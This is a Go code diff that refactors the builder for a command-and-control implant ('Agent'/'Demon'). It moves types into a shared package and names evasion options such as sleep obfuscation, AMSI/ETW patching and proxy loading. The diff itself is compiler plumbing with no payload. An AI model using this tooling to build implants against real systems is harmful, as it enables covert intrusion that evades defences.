@@ -1,8 +1,8 @@
 package Builder
 
 import (
-	TSCommon "AllSecure/TeamServer/Common"
 	"AllSecure/TeamServer/Common/Packer"
+	"AllSecure/TeamServer/Common/Types"
 	"AllSecure/TeamServer/Common/Utility"
 	"AllSecure/TeamServer/Common/win32"
 	"AllSecure/TeamServer/Crypt"
@@ -18,139 +18,21 @@ import (
 	"strings"
 )
 
-const (
-	PayloadDir  = "Payloads"
-	PayloadName = "Agent"
-)
-
-const (
-	FILETYPE_WINDOWS_EXE            = 1
-	FILETYPE_WINDOWS_SERVICE_EXE    = 2
-	FILETYPE_WINDOWS_DLL            = 3
-	FILETYPE_WINDOWS_REFLECTIVE_DLL = 4
-	FILETYPE_WINDOWS_RAW_BINARY     = 5
-)
-
-const (
-	SLEEPOBF_NO_OBF  = 0
-	SLEEPOBF_EKKO    = 1
-	SLEEPOBF_ZILEAN  = 2
-	SLEEPOBF_FOLIAGE = 3
-)
-
-const (
-	SLEEPOBF_BYPASS_NONE   = 0
-	SLEEPOBF_BYPASS_JMPRAX = 1
-	SLEEPOBF_BYPASS_JMPRBX = 2
-)
-
-const (
-	PROXYLOADING_NONE             = 0
-	PROXYLOADING_RTLREGISTERWAIT  = 1
-	PROXYLOADING_RTLCREATETIMER   = 2
-	PROXYLOADING_RTLQUEUEWORKITEM = 3
-)
-
-const (
-	AMSIETW_PATCH_NONE   = 0
-	AMSIETW_PATCH_HWBP   = 1
-	AMSIETW_PATCH_MEMORY = 2
-)
-
-const (
-	ARCHITECTURE_X64 = 1
-	ARCHITECTURE_X86 = 2
-)
-
-type ListenerConfig struct {
-	Name         string   `json:"Name"`
-	Method       string   `json:"Method"`
-	UserAgent    string   `json:"UserAgent"`
-	Headers      []string `json:"Headers"`
-	HostHeader   string   `json:"HostHeader"`
-	Secure       bool     `json:"Secure"`
-	HostRotation string   `json:"HostRotation"`
-	Hosts        []string `json:"Hosts"`
-	KillDate     int64    `json:"KillDate"`
-	WorkingHours string   `json:"WorkingHours"`
-}
-
-type BuilderConfig struct {
-	Compiler64 string
-	Compiler86 string
-	Nasm       string
-	DebugDev   bool
-	SendLogs   bool
-}
-
 type AgentBuilder struct {
-	buildSource bool
-	sourcePath  string
-	silent      bool
-
-	Payloads []string
-
-	FilesCreated []string
-
-	CompileDir     string
-	FileExtenstion string
-
-	FileType int
-	ClientId string
-
-	PatchBinary bool
-
-	ProfileConfig struct {
-		Original any
-
-		MagicMzX64 string
-		MagicMzX86 string
-
-		ImageSizeX64 int
-		ImageSizeX86 int
-
-		ReplaceStringsX64 map[string]string
-		ReplaceStringsX86 map[string]string
-	}
-
-	ImplantConfig struct {
-		Arch           int            `json:"Arch"`
-		ListenerType   int            `json:"ListenerType"`
-		ListenerConfig ListenerConfig `json:"ListenerConfig"`
-		Sleep          string         `json:"Sleep"`
-		Jitter         string         `json:"Jitter"`
-	}
-
-	ImplantOptions struct {
-		Config []byte
-	}
-
-	compilerOptions struct {
-		Config BuilderConfig
-
-		SourceDirs  []string
-		IncludeDirs []string
-		CFlags      []string
-		Defines     []string
-
-		Main struct {
-			Demon string
-			Dll   string
-			Exe   string
-			Svc   string
-		}
-	}
-
-	outputPath string
+	Types.AgentBuilder
 }
 
-func NewImplantBuilder(config BuilderConfig, path string) *AgentBuilder {
-	var builder = new(AgentBuilder)
+func (ab *AgentBuilder) ParseConfigFile() {
 
-	builder.sourcePath = path + "/" + PayloadDir + "/" + "Agent" + "/"
-	builder.ImplantConfig.Arch = ARCHITECTURE_X64
+}
 
-	builder.compilerOptions.SourceDirs = []string{
+func NewImplantBuilder(config Types.BuilderConfig, path string) *Types.AgentBuilder {
+	var builder = new(Types.AgentBuilder)
+
+	builder.SourcePath = path + "/" + Types.PayloadDir + "/" + "Agent" + "/"
+	builder.ImplantConfig.Arch = Types.ARCHITECTURE_X64
+
+	builder.CompilerOptions.SourceDirs = []string{
 		"src/agent",
 		"src/Crypt",
 		"src/cstdreplacement",
@@ -160,7 +42,7 @@ func NewImplantBuilder(config BuilderConfig, path string) *AgentBuilder {
 		"src/Package",
 		"src/wolfssl",
 	}
-	builder.compilerOptions.IncludeDirs = []string{
+	builder.CompilerOptions.IncludeDirs = []string{
 		"include",
 		"include/wolfssl/oppenssl",
 		"include/wolfssl/wolfcrypt",
@@ -197,7 +79,7 @@ func NewImplantBuilder(config BuilderConfig, path string) *AgentBuilder {
 	*/
 
 	if config.DebugDev {
-		builder.compilerOptions.CFlags = []string{
+		builder.CompilerOptions.CFlags = []string{
 			"",
 			"-Os -fno-asynchronous-unwind-tables -masm=intel",
 			"-fno-ident -fpack-struct=8 -falign-functions=1",
@@ -206,7 +88,7 @@ func NewImplantBuilder(config BuilderConfig, path string) *AgentBuilder {
 			"-Wl, --no-seh --enable-stdcall-fixup --gc-sections",
 		}
 	} else {
-		builder.compilerOptions.CFlags = []string{"",
+		builder.CompilerOptions.CFlags = []string{"",
 			"-Os -fno-asynchronous-unwind-tables -masm=intel",
 			"-fno-ident -fpack-struct=8 -falign-functions=1",
 			"-s -ffunction-sections -fdata-sections -falign-jumps=1 -w",
@@ -215,9 +97,9 @@ func NewImplantBuilder(config BuilderConfig, path string) *AgentBuilder {
 		}
 	}
 
-	builder.compilerOptions.Main.Exe = "src/main/main.c"
+	builder.CompilerOptions.Main.Exe = "src/main/main.c"
 
-	builder.compilerOptions.Config = config
+	builder.CompilerOptions.Config = config
 	builder.PatchBinary = false
 
 	return builder
@@ -228,15 +110,15 @@ func (ab *AgentBuilder) Build() bool {
 		CompilerCommand string
 	)
 
-	ab.CompileDir = "C:\\Windows\\Temp\\" + PayloadDir + "\\"
+	ab.CompileDir = "C:\\Windows\\Temp\\" + Types.PayloadDir + "\\"
 	err := os.Mkdir(ab.CompileDir, os.ModePerm)
 	if err != nil {
 		log.Println("[error] attempting to create compile directory: ", err.Error())
 		return false
 	}
 
-	if ab.outputPath == "" && ab.FileExtenstion != "" {
-		ab.SetOutputPath(ab.CompileDir + PayloadName + ab.FileExtenstion)
+	if ab.OutputPath == "" && ab.FileExtenstion != "" {
+		ab.SetOutputPath(ab.CompileDir + Types.PayloadName + ab.FileExtenstion)
 	}
 
 	Config, err := ab.PatchConfig()
@@ -254,30 +136,30 @@ func (ab *AgentBuilder) Build() bool {
 		}
 	}
 	ConfigByteString += "}"
-	ab.compilerOptions.Defines = append(ab.compilerOptions.Defines, "CONFIG_BYTES="+ConfigByteString)
+	ab.CompilerOptions.Defines = append(ab.CompilerOptions.Defines, "CONFIG_BYTES="+ConfigByteString)
 	log.Println("[info] Config Bytes: ", ConfigByteString)
 
-	if ab.ImplantConfig.Arch == ARCHITECTURE_X64 {
-		abs, err := filepath.Abs(ab.compilerOptions.Config.Compiler64)
+	if ab.ImplantConfig.Arch == Types.ARCHITECTURE_X64 {
+		abs, err := filepath.Abs(ab.CompilerOptions.Config.Compiler64)
 		if err != nil {
 			log.Println("[error] attempting to get absolute path for compiler: ", err)
 			return false
 		}
-		ab.compilerOptions.Config.Compiler64 = abs
-		CompilerCommand += "\"" + ab.compilerOptions.Config.Compiler64 + "\" "
+		ab.CompilerOptions.Config.Compiler64 = abs
+		CompilerCommand += "\"" + ab.CompilerOptions.Config.Compiler64 + "\" "
 	} else {
-		abs, err := filepath.Abs(ab.compilerOptions.Config.Compiler86)
+		abs, err := filepath.Abs(ab.CompilerOptions.Config.Compiler86)
 		if err != nil {
 			log.Println("[error] attempting to get absolute path for compiler: ", err)
 			return false
 		}
-		ab.compilerOptions.Config.Compiler86 = abs
-		CompilerCommand += "\"" + ab.compilerOptions.Config.Compiler86 + "\" "
+		ab.CompilerOptions.Config.Compiler86 = abs
+		CompilerCommand += "\"" + ab.CompilerOptions.Config.Compiler86 + "\" "
 	}
 
 	//add sources
-	for _, dir := range ab.compilerOptions.SourceDirs {
-		files, err := os.ReadDir(ab.sourcePath + "/" + dir)
+	for _, dir := range ab.CompilerOptions.SourceDirs {
+		files, err := os.ReadDir(ab.SourcePath + "/" + dir)
 		if err != nil {
 			log.Println("[error] attempting to read source directory: ", err)
 			return false
@@ -287,15 +169,15 @@ func (ab *AgentBuilder) Build() bool {
 
 			// only add the assembly if the agent is x64
 			if path.Ext(f.Name()) == ".asm" {
-				if (strings.Contains(f.Name(), ".x64.") && ab.ImplantConfig.Arch == ARCHITECTURE_X64) ||
-					(strings.Contains(f.Name(), ".x86.") && ab.ImplantConfig.Arch == ARCHITECTURE_X86) {
+				if (strings.Contains(f.Name(), ".x64.") && ab.ImplantConfig.Arch == Types.ARCHITECTURE_X64) ||
+					(strings.Contains(f.Name(), ".x86.") && ab.ImplantConfig.Arch == Types.ARCHITECTURE_X86) {
 					rand_name, _ := Crypt.GenerateRandomString(10)
 					AsmObj := ab.CompileDir + rand_name + ".o"
 					var AsmCompileStr string
-					if ab.ImplantConfig.Arch == ARCHITECTURE_X64 {
-						AsmCompileStr = fmt.Sprintf(ab.compilerOptions.Config.Nasm+" -f win64 %s -o %s", FilePath, AsmObj)
+					if ab.ImplantConfig.Arch == Types.ARCHITECTURE_X64 {
+						AsmCompileStr = fmt.Sprintf(ab.CompilerOptions.Config.Nasm+" -f win64 %s -o %s", FilePath, AsmObj)
 					} else {
-						AsmCompileStr = fmt.Sprintf(ab.compilerOptions.Config.Nasm+" -f win32 %s -o %s", FilePath, AsmObj)
+						AsmCompileStr = fmt.Sprintf(ab.CompilerOptions.Config.Nasm+" -f win32 %s -o %s", FilePath, AsmObj)
 					}
 					ab.FilesCreated = append(ab.FilesCreated, AsmObj)
 					ab.CompileCmd(AsmCompileStr)
@@ -307,32 +189,32 @@ func (ab *AgentBuilder) Build() bool {
 		}
 	}
 	// add all include files under include directories
-	for _, dir := range ab.compilerOptions.IncludeDirs {
+	for _, dir := range ab.CompilerOptions.IncludeDirs {
 		CompilerCommand += "-I" + dir + " "
 	}
 
 	// add all compiler flags
-	CompilerCommand += strings.Join(ab.compilerOptions.CFlags, " ")
+	CompilerCommand += strings.Join(ab.CompilerOptions.CFlags, " ")
 
 	// add all definitions. Will compile with -D flag
 	// adds preprocessor declarations to the code so that certain code sections will run when
 	// the defines are set.
-	ab.compilerOptions.Defines = append(ab.compilerOptions.Defines, ab.GetListenerDefinitons()...)
-	for _, define := range ab.compilerOptions.Defines {
+	ab.CompilerOptions.Defines = append(ab.CompilerOptions.Defines, ab.GetListenerDefinitons()...)
+	for _, define := range ab.CompilerOptions.Defines {
 		CompilerCommand += "-D" + define + " "
 	}
 
 	switch ab.FileType { // will only by exe for now
-	case FILETYPE_WINDOWS_EXE:
-		if ab.ImplantConfig.Arch == ARCHITECTURE_X64 {
+	case Types.FILETYPE_WINDOWS_EXE:
+		if ab.ImplantConfig.Arch == Types.ARCHITECTURE_X64 {
 			CompilerCommand += "-D MAIN_THREADED -e main"
 		} else {
 			CompilerCommand += "-D MAIN_THREADED -e _main"
 		}
-		CompilerCommand += ab.compilerOptions.Main.Exe + " "
+		CompilerCommand += ab.CompilerOptions.Main.Exe + " "
 		break
 	}
-	CompilerCommand += "-o" + ab.outputPath
+	CompilerCommand += "-o" + ab.OutputPath
 
 	Success := ab.CompileCmd(CompilerCommand)
 	return Success
@@ -378,7 +260,7 @@ func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
 	AgentConfig.AddInt(Jitter)
 
 	switch ab.ImplantConfig.ListenerType {
-	case TSCommon.HTTP_SERVER:
+	case Types.HTTP_SERVER:
 		var (
 			Config = ab.ImplantConfig.ListenerConfig
 			err    error
@@ -454,7 +336,7 @@ func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
 }
 
 func (ab *AgentBuilder) SetOutputPath(path string) {
-	ab.outputPath = path
+	ab.OutputPath = path
 }
 
 func (ab *AgentBuilder) CompileCmd(cmd string) bool {
@@ -465,7 +347,7 @@ func (ab *AgentBuilder) CompileCmd(cmd string) bool {
 		err         error
 	)
 
-	CommandLine.Dir = ab.sourcePath
+	CommandLine.Dir = ab.SourcePath
 	CommandLine.Stdout = &stdout
 	CommandLine.Stderr = &stderr
 
@@ -481,10 +363,10 @@ func (ab *AgentBuilder) GetListenerDefinitons() []string {
 	var def []string
 
 	switch ab.ImplantConfig.ListenerType {
-	case TSCommon.HTTP_SERVER:
+	case Types.HTTP_SERVER:
 		def = append(def, "TRANSPORT_HTTP")
 		break
-	case TSCommon.SMB_SERVER:
+	case Types.SMB_SERVER:
 		def = append(def, "TRANSPORT_SMB")
 		break
 	}
